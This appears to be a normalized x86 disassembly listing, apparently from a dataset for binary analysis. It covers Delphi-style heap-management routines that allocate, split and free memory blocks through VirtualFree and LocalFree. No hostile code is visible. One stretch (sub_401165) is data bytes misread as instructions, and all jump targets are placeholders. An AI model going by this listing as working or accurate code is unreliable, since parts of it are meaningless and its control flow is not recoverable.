sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x64004010 ]
xor al 0x40
add [ eax ] ch
push esi
inc eax
add [ esi + edx * 2 ] dh
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ esi + edx * 2 + 0x40 ] al
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov [ ecx ] fs
inc esi
add [ ebx - 0x77da0040 ] cl
and [ esi ] eax
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a54
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a54
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a54
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
